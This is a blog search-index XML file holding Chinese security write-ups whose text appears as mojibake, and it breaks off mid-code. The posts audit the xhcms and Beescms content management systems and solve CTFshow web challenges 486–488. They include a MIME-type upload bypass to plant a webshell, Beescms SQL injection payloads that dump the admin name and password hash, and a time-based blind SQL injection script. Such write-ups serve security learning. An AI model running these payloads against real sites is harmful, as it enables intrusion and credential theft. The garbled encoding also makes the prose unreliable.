<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>xhcmså®¡è®¡</title>
      <link href="/2021/09/20/xhcms-shen-ji/"/>
      <url>/2021/09/20/xhcms-shen-ji/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ç†Šæµ·cmsä»£ç å®¡è®¡ä¹‹æ–‡ä»¶åŒ…å«"><a href="#ç†Šæµ·cmsä»£ç å®¡è®¡ä¹‹æ–‡ä»¶åŒ…å«" class="headerlink" title="ç†Šæµ·cmsä»£ç å®¡è®¡ä¹‹æ–‡ä»¶åŒ…å«"></a>ç†Šæµ·cmsä»£ç å®¡è®¡ä¹‹æ–‡ä»¶åŒ…å«</h1><p><strong>xhcms-æ— æ¡†æ¶-æ–‡ä»¶åŒ…å«è·¨ç«™-æœç´¢æˆ–åº”ç”¨-include</strong></p><p>é€šè¿‡åº”ç”¨åŠ URL åœ°å€ç­‰åˆ†æå¯èƒ½å­˜åœ¨ xss åŠåŒ…å«å®‰å…¨ æŠ“åŒ…æ‰¾åˆ° XSS æ— è¿‡æ»¤ä»£ç å—åŠæ–‡ä»¶åŒ…å«æœ‰åç¼€éœ€ç»•è¿‡ä»£ç å—</p><p>å…¨å±€æœç´¢echoï¼š</p><ul><li>contact.phpï¼š<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210920152201705.png" alt="image-20210920152201705"></li></ul><p>å‰ä¸€ä¸ªå˜é‡é™æ€åŒ–æ²¡æ³•åˆ©ç”¨ï¼Œåè€…çš„è¿‡æ»¤æ–¹å¼æ²¡æœ‰é’ˆå¯¹æ€§åœ¨sqlå¯¹xssæ²¡æœ‰å¤šå¤§å½±å“ï¼š<br>éœ€è¦è¡¥é½å‚æ•°ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210920170326452.png" alt="image-20210920170326452"></p><p>å…¨å±€æœç´¢include:</p><ul><li>index.php:</li></ul><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//å•ä¸€å…¥å£æ¨¡å¼</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//å…³é—­é”™è¯¯æ˜¾ç¤º</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//æ¥æ”¶æ–‡ä»¶å</span><span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token operator">==</span><span class="token string">''</span><span class="token operator">?</span><span class="token string">'index'</span><span class="token punctuation">:</span><span class="token variable">$file</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//åˆ¤æ–­ä¸ºç©ºæˆ–è€…ç­‰äºindex</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'files/'</span><span class="token punctuation">.</span><span class="token variable">$action</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//è½½å…¥ç›¸åº”æ–‡ä»¶</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>filesç›®å½•ä¸‹æœ‰shell.phpæ–‡ä»¶(è‡ªå·±å†™çš„)</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210920182623197.png" alt="image-20210920182623197"></p>]]></content>
      
      
      <categories>
          
          <category> CMS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>beescmså®¡è®¡</title>
      <link href="/2021/09/18/beescms-shen-ji/"/>
      <url>/2021/09/18/beescms-shen-ji/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Beescmsä»£ç å®¡è®¡ä¹‹ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#Beescmsä»£ç å®¡è®¡ä¹‹ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="Beescmsä»£ç å®¡è®¡ä¹‹ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>Beescmsä»£ç å®¡è®¡ä¹‹ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ¬¡ä»£ç å®¡è®¡è¿‡ç¨‹ä¸»è¦é’ˆå¯¹æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆçº§å®¡è®¡æµç¨‹çš„æ€è·¯è¿›è¡Œå¤ç°</p><h2 id="å…³é”®ä»£ç "><a href="#å…³é”®ä»£ç " class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h2><p>æ–‡ä»¶ä¸Šä¼ ï¼š <code>$_FILES,type=&quot;file&quot;ï¼Œä¸Šä¼ ï¼Œmove_upload_file()ç­‰</code></p><h2 id="å¼€å§‹"><a href="#å¼€å§‹" class="headerlink" title="å¼€å§‹"></a>å¼€å§‹</h2><p>æœç´¢<code>type=&quot;file&quot;</code>å­—æ®µå‘ç°ä¸å°‘ä¸œè¥¿ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210918185339960.png" alt="image-20210918185339960"></p><p><strong>é€‰æ‹©ç¬¬äºŒä¸ª,å‘ç°äº†ç”¨æˆ·è‡ªå®šä¹‰çš„å‡½æ•°ï¼š</strong><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210918191857052.png" alt="image-20210918191857052"></p><p><strong>è·Ÿè¸ªä¸€ä¸‹ï¼š</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210918192432989.png" alt="image-20210918192432989"></p><p>ç»“åˆå®é™…æƒ…å†µè¿›è¡ŒæŠ“åŒ…é€šè¿‡å‚æ•°å®šä½åˆ°ä»£ç ä¸­è¿›è¡Œç¡®å®šï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210918193215651.png" alt="image-20210918193215651"></p><p>å¯ä»¥ç¡®å®šç¡®å®æ˜¯è¿™ä¸€å—çš„ä»£ç </p><p><strong>ä¸¤å¤„æ»¤ç‚¹ï¼š</strong></p><ol><li>é’ˆå¯¹å¤ªå¤§çš„å›¾ç‰‡è¿›è¡Œäº†è¿‡æ»¤</li><li>å°†å›¾ç‰‡ç±»å‹ä¸ä¼ å…¥çš„å‚æ•°$typeæ•°ç»„è¿›è¡Œäº†æ¯”è¾ƒï¼Œåˆ¤æ–­æ˜¯å¦æ»¡è¶³æ•°ç»„ä¸­çš„ç±»å‹</li></ol><p>ç¬¬ä¸€ä¸ªä¸æ˜¯é—®é¢˜ï¼Œç¬¬äºŒä¸ªå¯ä»¥è·Ÿè¸ª$typeæ¥æŸ¥çœ‹å®šä¹‰äº†é‚£äº›ç±»å‹ï¼š</p><p>å›æº¯åˆ°ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼š</p><p><code>array(&#39;image/gif&#39;,&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/jpg&#39;,&#39;image/bmp&#39;,&#39;image/pjpeg&#39;,&#39;image/x-png&#39;)</code></p><p>æ•´ä¸ªæ¼æ´ä½“ç°çš„å¾ˆæ˜æ˜¾äº†ï¼Œmimeç±»å‹ç»•è¿‡å³å¯ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210918193846606.png" alt="image-20210918193846606"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210918194417007.png" alt="image-20210918194417007"></p><p>ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªä»€ä¹ˆé—®é¢˜ï¼Œå°±æ˜¯è·å–è·¯å¾„ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210918194821338.png" alt="image-20210918194821338"></p><p>è¿™é‡Œå°±å¯ä»¥è·å–è·¯å¾„ï¼Œç„¶åæœ¨é©¬ä¸€è¿å°±å¯ä»¥äº†</p><h2 id="åˆ©ç”¨å·²çŸ¥å‡½æ•°è¿›è¡Œæ¼æ´å†æŒ–æ˜ï¼š"><a href="#åˆ©ç”¨å·²çŸ¥å‡½æ•°è¿›è¡Œæ¼æ´å†æŒ–æ˜ï¼š" class="headerlink" title="åˆ©ç”¨å·²çŸ¥å‡½æ•°è¿›è¡Œæ¼æ´å†æŒ–æ˜ï¼š"></a>åˆ©ç”¨å·²çŸ¥å‡½æ•°è¿›è¡Œæ¼æ´å†æŒ–æ˜ï¼š</h2><p>ä¸Šå›å·²ç»çŸ¥é“up_imgå‡½æ•°éªŒè¯ä¸ä¸¥è°¨ï¼Œæ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬å°±é’ˆå¯¹up_imgå‡½æ•°è¿›è¡Œä¸€ä¸ªå…¨å±€æœç´¢ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210918203910928.png" alt="image-20210918203910928"></p><p>è¿™ä¸ªåœ°æ–¹åº”è¯¥éƒ½æ˜¯ä¸€æ ·çš„ä¸œè¥¿ï¼Œæ—¢ç„¶è°ƒç”¨åŒä¸€ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆåŸºæœ¬è¿™ä¸ªä¸Šä¼ ç‚¹ä¹Ÿå­˜åœ¨ä¸€æ ·çš„æ¼æ´ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210918204157912.png" alt="image-20210918204157912"></p><p>åŒæ ·çš„æ“ä½œï¼ŒåŒæ ·çš„æ€è·¯ï¼Œå°†æ¼æ´åˆ©ç”¨æœ€å¤§åŒ–iğŸ˜ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210918204349682.png" alt="image-20210918204349682"></p><p>æ­¤å¤„è‡ªåŠ¨è¿”å›è·¯å¾„ï¼š<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210918204609769.png" alt="image-20210918204609769"></p><p>è·¯å¾„ä¸€æ ·ï¼šgetshellï¼ï¼ï¼iğŸ˜</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210918204807568.png" alt="image-20210918204807568"></p><h1 id="Beescmsä»£ç å®¡è®¡ä¹‹sqlæ³¨å…¥æ¼æ´"><a href="#Beescmsä»£ç å®¡è®¡ä¹‹sqlæ³¨å…¥æ¼æ´" class="headerlink" title="Beescmsä»£ç å®¡è®¡ä¹‹sqlæ³¨å…¥æ¼æ´"></a>Beescmsä»£ç å®¡è®¡ä¹‹sqlæ³¨å…¥æ¼æ´</h1><p>é’ˆå¯¹ç™»é™†é¡µé¢è¿›è¡ŒæŠ“åŒ…ä»¥æ‰¾åˆ°æ£€æµ‹é¡µé¢ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210919185210877.png" alt="image-20210919185210877"></p><p>æ‰¾åˆ°å…·ä½“æ£€æµ‹çš„å‡½æ•°ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210919192119150.png" alt="image-20210919192119150"></p><p>ç»è¿‡å…¨å±€è·Ÿè¸ªåœ¨fun.phpä¸­æ‰¾åˆ°äº†è¯¥å‡½æ•°çš„å®šä¹‰ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210919192329086.png" alt="image-20210919192329086"></p><p>å¯ä»¥çœ‹å‡ºæ¥$useræ²¡æœ‰ç»è¿‡ä»»ä½•å‡½æ•°å¤„ç†ï¼š</p><p>æ³¨å…¥æµ‹è¯•ï¼š<code>a&#39; or sleep(3)#</code>éªŒè¯ç è¦å¯¹ï¼Œæœç„¶ç¡äº†3ç§’è¯´æ˜æ˜¯æ³¨å…¥ç‚¹</p><p>è¿‡æ»¤ï¼š</p><p>fun.phpä¸­çš„fl_valueå‡½æ•°</p><pre class="line-numbers language-mysql"><code class="language-mysql">selectinsertupdateandinonleftjoinsdelete %=/**.././unionfromwheregroupintoload_fileoutfile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fun.phpä¸­çš„fl_htmlå‡½æ•°ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">fl_html</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/func-string-htmlspecialchars.html" target="_blank" rel="noopener">PHP htmlspecialchars() å‡½æ•°</a></p><p>é‚£ä¹ˆç»“åˆä¸‹é¢payloadå¯ä»¥è¿›è¡Œæ³¨å…¥ï¼š</p><pre class="line-numbers language-mysql"><code class="language-mysql">//çˆ†ç ´åº“åyn8rt'and extractvalue(1,concat(0x7e,select database(),0x7e))#//åˆ©ç”¨åŒå†™+ç©ºæ ¼ç»•è¿‡è¿‡æ»¤//çˆ†ç ´è¡¨åyn8rt' a and nd extractvalue(1,concat(0x7e,(selselectect table_name fr from om information_schema.tables wh where ere table_schema like 'beescms' limit 0,1),0x7e))#//çˆ†ç ´åˆ—åyn8rt' a and nd extractvalue(1,concat(0x7e,(selselectect column_name fr from om information_schema.columns wh where ere table_name like 'bees_admin' limit 0,1),0x7e))#//çˆ†ç ´adminè´¦æˆ·å:adminyn8rt' a and nd extractvalue(1,concat(0x7e,(selselectect admin_name fr from om beescms.bees_admin limit 0,1),0x7e))#//ç»“åˆsubstrå…¨éƒ¨çˆ†ç ´å¯†ç yn8rt' a and nd extractvalue(1,concat(0x7e,substr((selselectect admin_password fr from om beescms.bees_admin limit 0,1),3,32),0x7e))#//21232f297a57a5a743894a0e4a801fc3å¾ˆæ˜æ˜¾çš„md5å‡½æ•°å¤„ç†ï¼šadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210919200049760.png" alt="image-20210919200049760"></p>]]></content>
      
      
      <categories>
          
          <category> CMS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowä¹‹ä¸­æœŸæµ‹è¯„</title>
      <link href="/2021/09/17/ctfshow-zhi-zhong-qi-ce-ping/"/>
      <url>/2021/09/17/ctfshow-zhi-zhong-qi-ce-ping/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="web486â€”â€”åå°æ‰«æ"><a href="#web486â€”â€”åå°æ‰«æ" class="headerlink" title="web486â€”â€”åå°æ‰«æ"></a>web486â€”â€”åå°æ‰«æ</h1><p>å¼€å±€å‡é¡µé¢ï¼Œæ‰«æåå°</p><p>CTFå¸¸ç”¨å­—å…¸æ•´ç†ï¼š</p><pre><code>.index.php.swpindex.php.swpindex.php.bak.index.php~index.php.bak_Edietplusindex.php.~index.php.~1~index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gzwww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rarrobots.txtrobot.txtflag.php</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210917171406025.png" alt="image-20210917171406025"></p><p>åˆ©ç”¨åé¢çš„actionå‚æ•°è¯»å–ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210917171613846.png" alt="image-20210917171613846"></p><h1 id="web487â€”â€”sqlæ³¨å…¥æµ‹è¯•"><a href="#web487â€”â€”sqlæ³¨å…¥æµ‹è¯•" class="headerlink" title="web487â€”â€”sqlæ³¨å…¥æµ‹è¯•"></a>web487â€”â€”sqlæ³¨å…¥æµ‹è¯•</h1><p><code>?action=../index</code>è¯»å–æºä»£ç ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-03-08 15:43:51# @Last Modified by:   h1xa# @Last Modified time: 2021-03-08 22:30:08# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'render/render_class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'render/db_class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'location:index.php?action=login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">==</span><span class="token string">'check'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select id from user where username = md5('$username') and password=md5('$password') order by id limit 1"</span><span class="token punctuation">;</span>    <span class="token variable">$user</span><span class="token operator">=</span>db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">select_one</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'location:index.php?action=login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">==</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>sqlæµ‹è¯•ï¼š</p><pre><code>1&#39;) or sleep(3)#</code></pre><p>å¯ç¡ç€ï¼ï¼</p><p>pythonè„šæœ¬è·‘å°±å¯ä»¥äº†</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://6a6450b5-0579-4051-ae02-0362513e6842.challenge.ctf.show:8080/index.php?action=check&amp;username=yn8rt&amp;password=1') or "</span>result <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">126</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        payload <span class="token operator">=</span> f<span class="token string">"if(ascii(substr((select flag from flag),{i},1))>{mid},sleep(2),0)+--+"</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web488â€”â€”ä»£ç å®¡è®¡"><a href="#web488â€”â€”ä»£ç å®¡è®¡" class="headerlink" title="web488â€”â€”ä»£ç å®¡è®¡"></a>web488â€”â€”ä»£ç å®¡è®¡</h1><p><strong>index.phpï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'render/render_class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'render/db_class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'location:index.php?action=login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">==</span><span class="token string">'check'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select id from user where username = '"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"' and password='"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"' order by id limit 1"</span><span class="token punctuation">;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//å°†æ•°ç»„ä¸­çš„å€¼è½¬æ¢ä¸ºå˜é‡ï¼Œå¹¶ä»¥é”®åå‘½å</span>    <span class="token variable">$user</span><span class="token operator">=</span>db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">select_one</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ç”¨å¤„ä¸å¤§ï¼Œä¸éœ€è¦è¿½è¸ª</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è¿½è¸ª</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">==</span><span class="token string">'clear'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'rm -rf cache/*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'cache clear'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">==</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    templateUtil<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token 